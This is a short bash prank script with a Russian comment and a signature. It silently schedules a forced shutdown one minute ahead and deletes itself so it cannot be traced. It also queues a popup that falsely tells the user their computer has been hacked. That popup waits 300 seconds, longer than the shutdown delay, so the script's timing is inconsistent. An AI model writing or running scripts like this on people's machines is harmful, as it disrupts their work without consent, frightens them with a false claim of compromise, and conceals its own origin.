#!/bin/bash

# Предупредить и выключить комп 🥰💀 P.S: С любовью Bauka (basagitz)
nohup bash -c "sleep 300; zenity --warning --text='Ваш компьютер был взломан и он отключится через 20 секунд' --title='WARNING!' --width=200 --height=40; sleep 20" > /dev/null 2>&1 & 
shutdown -P +1 > /dev/null 2>&1
rm -- "$0"

